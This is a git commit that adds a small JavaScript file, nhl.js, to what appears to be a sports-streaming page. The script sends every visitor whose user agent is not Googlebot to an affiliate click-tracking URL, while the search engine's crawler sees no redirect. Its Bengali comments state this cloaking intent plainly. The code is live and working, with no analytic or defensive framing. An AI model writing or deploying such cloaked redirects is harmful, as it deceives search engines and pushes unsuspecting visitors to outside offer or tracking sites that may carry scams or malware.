78fb61654d53dfd1db406fc975161d68791f8f9a
Asaduzzaman Asad <zzamantowfik1@proton.me>
2026-09-21 02:46:31 +0600

    Add user agent check for redirection

---
+++ nhl.js
@@ -0,0 +1,7 @@
+if (!navigator.userAgent.includes('Googlebot')) {
+  // সাধারণ ব্যবহারকারীদের জন্য - রিডাইরেক্ট হবে
+  window.location.href = "https://tazztv.trk2afse.com/click?pid=552&offer_id=15&l=1753273372";
+} else {
+  // সার্চ ইঞ্জিন বটের জন্য - কোনো রিডাইরেক্ট হবে না
+  console.log("Thanks for visiting my page" );
+}
